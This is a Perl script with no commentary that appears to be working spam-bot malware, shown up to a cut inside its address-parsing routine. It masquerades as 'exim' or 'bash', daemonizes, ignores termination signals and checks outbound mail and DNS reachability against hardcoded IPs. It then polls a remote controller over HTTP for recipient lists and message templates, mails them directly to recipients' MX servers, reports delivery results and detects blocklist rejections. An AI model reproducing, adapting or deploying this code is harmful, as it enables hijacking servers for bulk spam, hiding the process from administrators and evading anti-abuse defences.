#!/usr/bin/perl
use strict; use IO::Socket; use IO::Select; my @fps = ("exim", "bash", "proc"); my $nps = $fps[int rand scalar @fps]; $0 = $nps; $| = 1;
my $ewblock = 11; my $eiprogr = 150;if ($^O eq "linux") { $ewblock = 11; $eiprogr = 115; }
if ($^O eq "freebsd") { $ewblock = 35; $eiprogr = 36; }
if ($^O eq "MSWin32") { $ewblock = 10035; $eiprogr = 10036; }
my $test = {
os => [$^O],
ip => ["0.0.0.0", "216.146.43.70", "77.88.55.60"],
tcp25 => [0, "65.55.92.184", "152.163.0.100", "98.138.112.38"],
udp53 => [0, "205.188.157.232", "64.12.51.132"],
tcp53 => [0, "205.188.157.232", "64.12.51.132"],
tcp80 => [0, "216.146.43.70", "77.88.55.60"]
}; &init(); $_ = 'Jm7'.'3uZ'; print "Content-type: text/plain; charset=iso-8859-1\x0D\x0A\x0D\x0A$_"; exit 0;
sub main
{
my $s_host = shift; my $s_port = shift; my $s_path = shift; my $s_nsex = shift;
if ($^O ne "MSWin32")
{
use POSIX qw(setsid);
return unless defined (my $child = fork);return if $child;POSIX::setsid();$SIG{$_} = "IGNORE" for (qw (HUP INT ILL FPE QUIT ABRT USR1 SEGV USR2 PIPE ALRM TERM CHLD));
umask 0;
chdir "/";open (STDIN, "</dev/null");open (STDOUT, ">/dev/null");open (STDERR, ">&STDOUT");
}
&test();
exit 0 if $test->{tcp25}[0] != 1;
if ($test->{udp53}[0] != 1 && $test->{tcp53}[0] != 1) { exit 0 if !defined $s_nsex; $s_nsex = pack ("C4", split (/\./, $s_nsex)); } else { $s_nsex = undef; }
srand; my $pid = $$; $pid = 1 + int rand 2147483648 if !defined $pid || $pid !~ /^\d+$/ || $pid > 4294967295;
my $s = {version => 8, command => 0, size => 0, timeout => 60, request => 1, host => pack ("C4", split (/\./, $s_host))};
my $b =
{
id			=> 0,
ip			=> "",
helo		=> undef,
timezone	=> [["+", "-"]->[int rand 2], (1 + int rand 6)],
nameserver	=> [],
timeout		=> 10,
session		=> 0,
copies		=> 1,
method		=> 0,
spf			=> 0,
level		=> 0,
mailbase	=> [],
from		=> [],
replyto		=> [],
subject		=> [],
header		=> "",
letter		=> "",
priority	=> 1,
type		=> 0,
charset		=> "",
good		=> [0, ""],
unlucky		=> [0, ""],
bad			=> [0, ""],
report		=> ""
};
my $readers = IO::Select->new() or exit 0;
my $writers = IO::Select->new() or exit 0;
my $session = {};
my $flagset = {timeout => 1};
my $cache = {};
my $reset_time = time;
my $reset_wait = 120;
my $reset_stat = 0;
my $first_exec = 1;
my $request_time = time;
my $request_flag = 1;
my $counter_addr = 0;
my $destroy = sub
{
my ($object, $handle) = @_;
if ($session->{$handle}{status} =~ /^rs/)
{
$request_flag = 1;
}
elsif (exists $session->{$handle}{object})
{
if ($_ = shift @{$session->{$handle}{object}})
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$_\x0A";
$b->{report} .= "$_ - [$session->{$handle}{status}] Timeout\x0A" if $b->{level} > 1;
}
push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
}
}
if (exists $session->{$handle}{mx})
{
$cache->{$session->{$handle}{mx}}[1] -- if $cache->{$session->{$handle}{mx}}[1] > 0;
}
delete $session->{$handle};
$object->remove($handle);
close $handle;
};
while (1)
{
IO::Select->select(undef, undef, undef, 0.01);
my $time = time;
if ($reset_stat != ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]))
{
$reset_stat = ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
$reset_time = $time + $reset_wait;
}
if ($time >= $reset_time)
{
$reset_time = $time + $reset_wait;
$reset_stat = 0;
$counter_addr = 0;
$b->{$_} = [] for (qw (mailbase from replyto subject));
$b->{$_} = [0, ""] for (qw (good unlucky bad));
$b->{report} = "";
$cache = {};
$session = {};
my $ha = [$writers->handles];
foreach my $hs (@$ha) { $writers->remove($hs); close $hs; }
$ha = [$readers->handles];
foreach my $hs (@$ha) { $readers->remove($hs); close $hs; }
$request_flag = 1;
$request_time = time;
next;
}
if ($request_flag && $time >= $request_time)
{
while (1)
{
my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
last unless $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($_ = sockaddr_in($s_port, $s->{host})))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;last;
}
}
unless ($writers->add($socket))
{
close $socket;last;
}
$session->{$socket} =
{
status	=> "rs_cn",
buffer	=> "",
flagset	=> $flagset->{timeout},
timeout	=> 0
};
$s->{$_} = 0 for (qw (command size));
if ($counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]))
{
$s->{command} = 1;
$s->{command} = 2 if $first_exec;
$reset_time = $time + $reset_wait;
$reset_stat = 0;
if ($counter_addr)
{
$s->{size} = 16;
$session->{$socket}{buffer} .= pack ("L", $b->{id});$session->{$socket}{buffer} .= pack ("L", $b->{$_}[0]) for (qw (good unlucky bad));
if ($b->{level})
{
for (qw (good unlucky bad))
{
$s->{size} += (4 + length $b->{$_}[1]);$session->{$socket}{buffer} .= pack ("L", length $b->{$_}[1]);$session->{$socket}{buffer} .= $b->{$_}[1];
}
if ($b->{level} > 1)
{
$s->{size} += (4 + length $b->{report});
$session->{$socket}{buffer} .= pack ("L", length $b->{report});
$session->{$socket}{buffer} .= $b->{report};
}
}
}
}
$session->{$socket}{buffer} = pack ("SC2L2", 0xDFDF, $s->{version}, $s->{command}, $pid, $s->{size}) . $session->{$socket}{buffer};
$s->{size} = length $session->{$socket}{buffer};$session->{$socket}{buffer} = "POST $s_path HTTP/1.0\x0D\x0AHost: $s_host\x0D\x0AContent-type: application/x-www-form-urlencoded\x0D\x0AContent-Length: $s->{size}\x0D\x0A\x0D\x0A$session->{$socket}{buffer}";
$request_flag = 0;last;
}
}
if (my $mail_array = shift @{$b->{mailbase}})
{
while (scalar @$mail_array)
{
my $mail = @{$mail_array}[0];
my ($mx) = &mail(\$mail);
$mx = lc ((split /\@/, $$mx)[1]);
my $type = 15;
if (exists $cache->{$mx})
{
my $sv = $mx;
$mx = $cache->{$sv}[0];if ($mx =~ /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/)
{
$cache->{$sv}[1] = 0 unless $cache->{$sv}[1];
if ($b->{session} && ($cache->{$sv}[1] >= $b->{session}))
{
push @{$b->{mailbase}}, $mail_array;
last;
}
if ($1 > 255 || $2 > 255 || $3 > 255 || $4 > 255)
{
while ($_ = shift @$mail_array)
{
$b->{bad}[0] ++;
if ($b->{level})
{
$b->{bad}[1] .= "$_\x0A";
$b->{report} .= "$_ - [mx_ip] Object non exists\x0A" if $b->{level} > 1;
}
}
last;
}
$mx = pack ("C4", $1, $2, $3, $4);
my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
unless ($socket)
{
push @{$b->{mailbase}}, $mail_array;
last;
}
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($_ = sockaddr_in(25, $mx)))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$mail\x0A";
$b->{report} .= "$mail - [mx_cn] Can't connect\x0A" if $b->{level} > 1;
}
shift @$mail_array;push @{$b->{mailbase}}, $mail_array if scalar @$mail_array;last;
}
}
unless ($writers->add($socket))
{
close $socket;push @{$b->{mailbase}}, $mail_array;last;
}
$cache->{$sv}[1] ++;
my $sender = @{$b->{from}}[int rand scalar @{$b->{from}}];
$sender =~ s/\@.+$/\@$b->{helo}/ if ($b->{spf} && $b->{helo} ne "localhost");
$session->{$socket} =
{
status	=> "mx_cn",
mx		=> $sv,
buffer	=> "",
object	=> $mail_array,
mindex	=> 0,
sender	=> $sender,
flagset	=> $flagset->{timeout},
timeout	=> 0
};
last;
}
else
{
$type = 1;
}
}
else
{
$type = 15;
}
my $socket;
if ($test->{udp53}[0] == 1)
{
$socket = IO::Socket::INET->new(Proto => "udp");
}
else
{
$socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
}
unless ($socket)
{
push @{$b->{mailbase}}, $mail_array;
last;
}
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
if ($test->{udp53}[0] == 0)
{
my $nameserver = shift @{$b->{nameserver}}; push @{$b->{nameserver}}, $nameserver;
if (defined $s_nsex) { $nameserver = sockaddr_in(25, $s_nsex); } else { $nameserver = sockaddr_in(53, $nameserver); }
unless ($socket->connect($nameserver))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$mail\x0A";
$b->{report} .= "$mail - [ns_cn] Can't connect\x0A" if $b->{level} > 1;
}
shift @$mail_array;push @{$b->{mailbase}}, $mail_array if scalar @$mail_array;last;
}
}
}
unless ($writers->add($socket))
{
close $socket;
push @{$b->{mailbase}}, $mail_array;
last;
}
$session->{$socket} =
{
status	=> "ns_wr",
buffer	=> "",
object	=> $mail_array,
sender	=> 0,
flagset	=> $flagset->{timeout},
timeout	=> 0,
type	=> $type,
packet	=> int rand 65536,
size	=> 0
};
$session->{$socket}{buffer} .= pack ("nSn4", $session->{$socket}{packet}, 1, 1, 0, 0, 0);$session->{$socket}{buffer} .= pack ("C", length $_) . $_ for (split (/\./, $mx));
$session->{$socket}{buffer} .= pack ("Cn2", 0, $session->{$socket}{type}, 1);$session->{$socket}{sender} = length $session->{$socket}{buffer};
if ($test->{udp53}[0] == 0)
{
$session->{$socket}{status} = "ns_cn";$session->{$socket}{buffer} = join ("", pack ("n", $session->{$socket}{sender}), $session->{$socket}{buffer});
}
last;
}
}
elsif ($counter_addr && !scalar keys %$session)
{
$counter_addr = ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]) if $counter_addr > ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
$request_time = $time if $counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
}
my $writable = [$writers->handles];
foreach my $handle (@$writable)
{
if ($session->{$handle}{flagset} & $flagset->{timeout})
{
if ($session->{$handle}{status} =~ /^rs/)
{
$session->{$handle}{timeout} = $time + $s->{timeout};
}
else
{
$session->{$handle}{timeout} = $time + $b->{timeout};
}
$session->{$handle}{flagset} ^= $flagset->{timeout};
}
elsif ($time >= $session->{$handle}{timeout})
{
$destroy->($writers, $handle);
}
}
$writable = (IO::Select->select(undef, $writers, undef, 0))[1];
foreach my $handle (@$writable)
{
if ($session->{$handle}{status} =~ /cn$/)
{
if ($handle->connected)
{
if ($session->{$handle}{status} eq "rs_cn")
{
$session->{$handle}{status} = "rs_wr";
}
elsif ($session->{$handle}{status} eq "ns_cn")
{
$session->{$handle}{status} = "ns_wr";
}
else
{
$session->{$handle}{status} = "mx_rd";
unless ($readers->add($handle))
{
$destroy->($writers, $handle);
next;
}
$writers->remove($handle);
}
}
else
{
$destroy->($writers, $handle);
}
}
else
{
my $result;
if ($session->{$handle}{status} eq "ns_wr")
{
if ($test->{udp53}[0] == 0)
{
$result = $handle->send($session->{$handle}{buffer});
}
else
{
my $nameserver = shift @{$b->{nameserver}}; push @{$b->{nameserver}}, $nameserver;
$result = $handle->send($session->{$handle}{buffer}, 0, $_ = sockaddr_in(53, $nameserver));
}
}
else
{
$result = syswrite ($handle, $session->{$handle}{buffer});
}
if (defined $result && $result > 0)
{
substr ($session->{$handle}{buffer}, 0, $result) = "";
if (length $session->{$handle}{buffer} < 1)
{
if ($session->{$handle}{status} eq "rs_wr")
{
$session->{$handle}{status} = "rs_rd";
if ($s->{command} && $counter_addr && ($counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0])))
{
$counter_addr = 0;
$b->{$_} = [] for (qw (mailbase from replyto subject));
$b->{$_} = [0, ""] for (qw (good unlucky bad));
$b->{report} = "";
$cache = {};
}
$request_time = $time + $s->{request} * 60;
}
elsif ($session->{$handle}{status} eq "ns_wr")
{
$session->{$handle}{status} = "ns_rd";
}
unless ($readers->add($handle))
{
$destroy->($writers, $handle);
next;
}
$writers->remove($handle);
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($writers, $handle);
}
}
}
my $readable = [$readers->handles];
foreach my $handle (@$readable)
{
if ($session->{$handle}{flagset} & $flagset->{timeout})
{
if ($session->{$handle}{status} =~ /^rs/)
{
$session->{$handle}{timeout} = $time + $s->{timeout};
}
else
{
$session->{$handle}{timeout} = $time + $b->{timeout};
}
$session->{$handle}{flagset} ^= $flagset->{timeout};
}
elsif ($time >= $session->{$handle}{timeout})
{
$destroy->($readers, $handle);
}
}
$readable = (IO::Select->select($readers, undef, undef, 0))[0];
foreach my $handle (@$readable)
{
my $result;
if ($session->{$handle}{status} eq "ns_rd")
{
if ($test->{udp53}[0] == 0)
{
my $tempbuffer = "";
if ($session->{$handle}{size} == 0)
{
$handle->recv($tempbuffer, (2 - length $session->{$handle}{buffer}));
$session->{$handle}{buffer} .= $tempbuffer;
if (2 == length $session->{$handle}{buffer})
{
$session->{$handle}{size} = unpack ("n", $session->{$handle}{buffer});
$session->{$handle}{buffer} = "";
}
next;
}
$handle->recv($tempbuffer, ($session->{$handle}{size} - length $session->{$handle}{buffer}));
$session->{$handle}{buffer} .= $tempbuffer;
if ($session->{$handle}{size} == length $session->{$handle}{buffer})
{
$result = $session->{$handle}{size};
}
}
else
{
$result = $handle->recv($session->{$handle}{buffer}, 512);
$result = length $session->{$handle}{buffer} if defined $result;
}
}
else
{
$result = sysread ($handle, $session->{$handle}{buffer}, 16384, length $session->{$handle}{buffer});
}
if (defined $result)
{
if ($result > 0)
{
if ($session->{$handle}{status} eq "rs_rd")
{
next if 4 > length $session->{$handle}{buffer};
if ($session->{$handle}{buffer} !~ /^HTTP/)
{
$destroy->($readers, $handle);
next;
}
else
{
my $offset = index ($session->{$handle}{buffer}, "\x0D\x0A\x0D\x0A");
next unless $offset >= 0;
my $xoplf = "HTTP";
if ($session->{$handle}{buffer} =~ /^$xoplf\S+\s+([^\x0D\x0A]*)/)
{
if ($1 !~ /^200/)
{
$destroy->($readers, $handle);
next;
}
$offset += 4;
next if 10 > (length $session->{$handle}{buffer}) - $offset;
my $server =
{
sign		=> 0,
timeout		=> 0,
request		=> 0,
command		=> 0,
size		=> 0
};
@_ = unpack ("S2C2L", substr ($session->{$handle}{buffer}, $offset, 10));$server->{$_} = shift @_ for (qw (sign timeout request command size));if ($server->{sign} != 0xEFEF)
{
$destroy->($readers, $handle);next;
}
$first_exec = 0;
exit 0 if $server->{command};
$s->{timeout} = $server->{timeout};
$s->{request} = $server->{request};
$request_time = $time + $s->{request} * 60;
unless ($server->{size})
{
$destroy->($readers, $handle);
next;
}
$offset += 10;
next if $server->{size} > (length $session->{$handle}{buffer}) - $offset;
substr ($session->{$handle}{buffer}, 0, $offset) = "";
@_ = unpack ("La4", substr ($session->{$handle}{buffer}, 0, 8, ""));$b->{$_} = shift @_ for (qw (id ip));$b->{nameserver} = [];
push @{$b->{nameserver}}, substr ($session->{$handle}{buffer}, 0, 4, "") for (1..16);
@_ = unpack ("S2C4", substr ($session->{$handle}{buffer}, 0, 8, ""));
$b->{$_} = shift @_ for (qw (timeout session copies method spf level));
@{$b->{$_}} = split ("\x0A", substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "")) for (qw (mailbase from replyto subject));
$counter_addr = scalar @{$b->{mailbase}};
my $mailbase_temp = {};
while (my $mail_temp = shift @{$b->{mailbase}})
{
my ($host_temp) = &mail(\$mail_temp);
$host_temp = lc ((split /\@/, $$host_temp)[1]);
$mailbase_temp->{$host_temp} = [] unless exists $mailbase_temp->{$host_temp};push @{$mailbase_temp->{$host_temp}}, $mail_temp;
}
foreach my $host_temp (keys %$mailbase_temp)
{
while (scalar @{$mailbase_temp->{$host_temp}})
{
my $mail_temp = [];
for (1..$b->{copies})
{
last unless scalar @{$mailbase_temp->{$host_temp}};
push @$mail_temp, shift @{$mailbase_temp->{$host_temp}};
}
push @{$b->{mailbase}}, $mail_temp;
}
}
undef $mailbase_temp;
$b->{header} = substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "");
unless ($b->{header})
{
$b->{header} = ['Date: %DATE%', 'From: %FROMADDR%', 'Reply-To: %REPLYTOADDR%', 'X-Priority: %NPRIORITY%', 'Message-ID: <%MESSAGEID%@%HELO%>', 'To: %TOADDR%', 'Subject: %SUBJECT%'];
$b->{header} = join ("\x0D\x0A", @{$b->{header}}, 'MIME-Version: 1.0', 'Content-Type: text/%TYPE%; charset=%CHARSET%', 'Content-Transfer-Encoding: %ENCODING%');
}
$b->{letter} = substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "");
$b->{letter} = "" unless $b->{letter};
$b->{$_} = unpack ("C", substr ($session->{$handle}{buffer}, 0, 1, "")) for (qw (priority type));
$b->{charset} = substr ($session->{$handle}{buffer}, 0, length $session->{$handle}{buffer}, "");
$b->{ip} = join (".", unpack ("C4", $b->{ip}));
unless ($b->{helo})
{
if (defined $s_nsex)
{
$b->{helo} = &nsptr($_ = sockaddr_in(25, $s_nsex), 3, $b->{ip});
}
else
{
$b->{helo} = &nsptr($_ = sockaddr_in(53, $b->{nameserver}[0]), 3, $b->{ip});
$b->{helo} = &nsptr($_ = sockaddr_in(53, pack ("C4", split (/\./, "8.8.8.8"))), 3, $b->{ip}) unless $b->{helo};
}
$b->{helo} = "localhost" unless $b->{helo};
}
$b->{report} = "\x0ACLIENT V.$s->{version} IP=$b->{ip} PTR=$b->{helo} ID=$b->{id}\x0A\x0A" if $b->{level} > 1;
$destroy->($readers, $handle);
next;
}
else
{
$destroy->($readers, $handle);
next;
}
}
}
elsif ($session->{$handle}{status} eq "ns_rd")
{
if (length $session->{$handle}{buffer})
{
my ($resp, $code) = &nsparser(\$session->{$handle}{buffer}, $session->{$handle}{sender}, $session->{$handle}{packet}, $session->{$handle}{type});
if ($resp == 2)
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{bad}[0] ++;
if ($b->{level})
{
$b->{bad}[1] .= "$_\x0A";
$b->{report} .= "$_ - [ns_rd] $code\x0A" if $b->{level} > 1;
}
}
}
elsif ($resp == 1)
{
$resp = shift @{$session->{$handle}{object}};
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$resp\x0A";
$b->{report} .= "$resp - [ns_rd] $code\x0A" if $b->{level} > 1;
}
push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
}
else
{
$resp = @{$session->{$handle}{object}}[0];
($resp) = &mail(\$resp);
$resp = lc ((split /\@/, $$resp)[1]);
$cache->{$resp}[0] = $code;
push @{$b->{mailbase}}, $session->{$handle}{object};
}
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
}
elsif ($session->{$handle}{buffer} =~ /^[^\-]{4}.*\x0D\x0A$/m)
{
if ($session->{$handle}{buffer} !~ /^(2|3)/)
{
if ($b->{level} > 1)
{
$session->{$handle}{buffer} =~ s/\x0D//g;
$session->{$handle}{buffer} =~ s/[\x09|\x0A]+/\x20/g;
}
$session->{$handle}{mindex} -- if $session->{$handle}{mindex} > 0;
if ($session->{$handle}{status} =~ /^mx_(rd|gr)$/)
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$_\x0A";
$b->{report} .= "$_ - [$session->{$handle}{status}] Bad host $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
}
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
elsif ($session->{$handle}{status} =~ /^mx_(mf|rt)$/)
{
if ($session->{$handle}{buffer} =~ /\d+\.\d+\.\d+\.\d+/g || $session->{$handle}{buffer} =~ /( ip |block|black|reject|later|many)/ig)
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$_\x0A";
$b->{report} .= "$_ - [$session->{$handle}{status}] Bad host $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
}
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
else
{
$b->{bad}[0] ++;
if ($b->{level})
{
$b->{bad}[1] .= "$session->{$handle}{object}[$session->{$handle}{mindex}]\x0A";
$b->{report} .= "$session->{$handle}{object}[$session->{$handle}{mindex}] - [$session->{$handle}{status}] Invalid recipient $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
splice @{$session->{$handle}{object}}, $session->{$handle}{mindex}, 1;
unless (scalar @{$session->{$handle}{object}})
{
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
}
}
else
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$session->{$handle}{object}[$session->{$handle}{mindex}]\x0A";
$b->{report} .= "$session->{$handle}{object}[$session->{$handle}{mindex}] - [$session->{$handle}{status}] Delivery error $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
splice @{$session->{$handle}{object}}, $session->{$handle}{mindex}, 1;
push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
}
if ($session->{$handle}{status} eq "mx_rd")
{
my $helo = $b->{helo};
$session->{$handle}{buffer} = "E"."H";
$session->{$handle}{buffer} .= "L"."O"." $helo\x0D\x0A";
$session->{$handle}{status} = "mx_gr";
}
elsif ($session->{$handle}{status} eq "mx_gr")
{
my ($mail) = &mail(\$session->{$handle}{sender});
$session->{$handle}{buffer} = "MAIL ";
$session->{$handle}{buffer} .= "FROM: <$$mail>\x0D\x0A";
$session->{$handle}{status} = "mx_mf";
}
elsif ($session->{$handle}{status} eq "mx_mf")
{
my ($mail) = &mail(\$session->{$handle}{object}[$session->{$handle}{mindex}]);
$session->{$handle}{buffer} = "RCPT TO: <$$mail>\x0D\x0A";
$session->{$handle}{mindex} ++;
$session->{$handle}{status} = $session->{$handle}{mindex} >= scalar @{$session->{$handle}{object}} ? "mx_rt" : "mx_mf";
}
elsif ($session->{$handle}{status} eq "mx_rt")
{
$session->{$handle}{buffer} = "DATA\x0D\x0A";
$session->{$handle}{status} = "mx_dt";
}
elsif ($session->{$handle}{status} eq "mx_dt")
{
$session->{$handle}{buffer} = &data($session->{$handle}{object}, $session->{$handle}{sender}, $b);
$session->{$handle}{buffer} .= "\x0D\x0A.\x0D\x0A";
$session->{$handle}{status} = "mx_dr";
}
elsif ($session->{$handle}{status} eq "mx_dr")
{
$b->{good}[0] += scalar @{$session->{$handle}{object}};
if ($b->{level})
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{good}[1] .= "$_\x0A";
}
}
delete $session->{$handle}{object};
$session->{$handle}{buffer} = "QUIT\x0D\x0A";
$session->{$handle}{status} = "mx_qt";
}
else
{
$destroy->($readers, $handle);
next;
}
unless ($writers->add($handle))
{
$destroy->($readers, $handle);
next;
}
$readers->remove($handle);
}
}
else
{
$destroy->($readers, $handle);
next;
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($readers, $handle);
next;
}
}
}
}
sub nsunpack
{
my ($packet, $offset) = @_;
my ($length, $size, $name, $next) = (length $$packet, 0, "", "");
while (1)
{
return if $length < ($offset + 1);$size = unpack ("\@$offset C", $$packet);
if ($size == 0)
{
$offset ++;
last;
}
elsif (($size & 192) == 192)
{
return if $length < ($offset + 2);$next = unpack ("\@$offset n", $$packet);$next &= 16383;
($next) = &nsunpack($packet, $next);
return if !defined $next;
$name .= $next;
$offset += 2;
last;
}
else
{
$offset ++;
return if $length < ($offset + $size);
$next = substr ($$packet, $offset, $size);
$name .= "$next.";
$offset += $size;
}
}
$name =~ s/\.$//;
return if !length $name;
return ($name, $offset);
}
sub nsrecord
{
my ($packet, $offset) = @_;
my ($length, $name) = (length $$packet, "");
($name, $offset) = &nsunpack($packet, $offset);
return if !defined $name || $length < ($offset + 10);
my ($rtype, $rclass, $rttl, $rlength) = unpack ("\@$offset n2Nn", $$packet);
$offset += 10;
return if $length < ($offset + $rlength);
return ($name, $offset, $rtype, $rclass, $rttl, $rlength);
}
sub nsparser
{
my ($packet, $offset, $sequence, $type) = @_;
my ($length, $name) = (length $$packet, "");
return (1, "Broken header") if $length < 12;
@_ = unpack ("nC2n4", $$packet);
my $header =
{
id		=> $_[0],
qr		=> ($_[1] >> 7) & 1,
opcode	=> ($_[1] >> 3) & 15,
aa		=> ($_[1] >> 2) & 1,
tc		=> ($_[1] >> 1) & 1,
rd		=> $_[1] & 1,
ra		=> ($_[2] >> 7) & 1,
z		=> ($_[2] >> 4) & 6,
rcode	=> $_[2] & 15,
qdcount	=> $_[3],
ancount	=> $_[4],
nscount	=> $_[5],
arcount	=> $_[6]
};
return (1, "Synchronization error") if $header->{id} != $sequence;
return (1, "Recursion disabled") if !$header->{ra};
return (2, "Query format error") if $header->{rcode} == 1;
return (2, "Server failure") if $header->{rcode} == 2;
return (2, "Non-existent domain") if $header->{rcode} == 3;
return (2, "Empty answer section") if !$header->{ancount};
return (1, "Broken packet") if $length < $offset;
my ($answer, $rtype, $rclass, $rttl, $rlength) = ({}, 0, 0, 0, 0);
while ($header->{ancount})
{
$header->{ancount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);last if !defined $name;
if ($type != $rtype)
{
$offset += $rlength;
next;
}
if ($type == 1)
{
$name = substr ($$packet, $offset, 4);
last if !defined $name || 4 > length $name;
$offset += $rlength;
$name = inet_ntoa($name);
$answer->{$name} = 1;
}
elsif ($type == 12)
{
($name, $offset) = &nsunpack($packet, $offset);
last if !defined $name;
$answer->{$name} = 1;
}
elsif ($type == 15)
{
$sequence = substr ($$packet, $offset, 2);
last if !defined $sequence || 2 > length $sequence;
($name, $offset) = &nsunpack($packet, ($offset + 2));
last if !defined $name;
$answer->{$name} = unpack ("n", $sequence);
}
}
return (2, "No resourse records") if !scalar keys %$answer;
my $result = (sort {$answer->{$a} <=> $answer->{$b}} keys %$answer)[0];
if ($type == 15 && $header->{arcount})
{
while ($header->{nscount})
{
$header->{nscount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);
last if !defined $name;
$offset += $rlength;
}
while ($header->{arcount})
{
$header->{arcount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);
last if !defined $name;
if ($rtype == 1 && exists $answer->{$name})
{
$name = substr ($$packet, $offset, 4);
last if !defined $name || 4 > length $name;
$result = inet_ntoa($name);
last;
}
$offset += $rlength;
}
}
return (0, $result);
}
sub nsptr
{
my ($packaddr, $timeout, $query) = @_; my $type = 12;
return if !defined $query || $query !~ /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/;
return if ($1 > 255 || $2 > 255 || $3 > 255 || $4 > 255);
$query = "$4.$3.$2.$1.in-addr.arpa";
my $packid = int rand 65536; my $packet = pack ("nSn4", $packid, 1, 1, 0, 0, 0);
$packet .= pack ("C", length $_) . $_ for (split (/\./, lc $query));
$packet .= pack ("Cn2", 0, $type, 1);
my $offset = length $packet;
my ($socket, $select, $buffer, $resp, $text, $size);
if ($test->{udp53}[0] == 1)
{
$socket = IO::Socket::INET->new(Proto=>"udp");
return unless $socket;
$select = new IO::Select $socket;
if ($select->can_write($timeout))
{
unless ($socket->send($packet, 0, $packaddr))
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
if ($select->can_read($timeout))
{
$socket->recv($buffer, 512);
}
else
{
close $socket;
return;
}
close $socket;
return if !defined $buffer || !length $buffer;
}
else
{
$socket = IO::Socket::INET->new(Proto=>"tcp", Type=>SOCK_STREAM);
return unless $socket;
$select = new IO::Select $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($packaddr))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
return;
}
unless ($select->can_write($timeout))
{
close $socket;
return;
}
unless ($socket->connected)
{
close $socket;
return;
}
}
$socket->blocking(1);
$packet = pack ("n", length $packet) . $packet;
if ($select->can_write($timeout))
{
unless ($socket->send($packet))
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
if ($select->can_read($timeout))
{
$buffer = ""; $text = 2;
while ((length $buffer) < $text)
{
$size = $text - length $buffer; $resp = "";unless ($socket->recv($resp, $size))
{
last if !length $resp;
}
last if !length $resp;
$buffer .= $resp;
}
if (!length $buffer)
{
close $socket;
return;
}
unless ($text = unpack ("n", $buffer))
{
close $socket;
return;
}
unless ($select->can_read($timeout))
{
close $socket;
return;
}
$buffer = "";
while ((length $buffer) < $text)
{
$size = $text - length $buffer; $resp = "";
unless ($socket->recv($resp, $size))
{
last if !length $resp;
}
last if !length $resp;
$buffer .= $resp;
}
unless ($text == length $buffer)
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
close $socket;
return if !defined $buffer || !length $buffer;
}
($resp, $text) = &nsparser(\$buffer, $offset, $packid, $type);
return !$resp ? $text : undef;
}
sub mail
{
my $line = shift;
return if !defined $$line || $$line !~ /^[^\@]+\@[^\@]+\.[^\@]+$/;
my ($name, $mail, $info) = $$line =~ /\s*(.*?)[\s\|<]*([^\s|<]+\@[^>\|\s]+)>*(.*)$/;
return if !$mail;
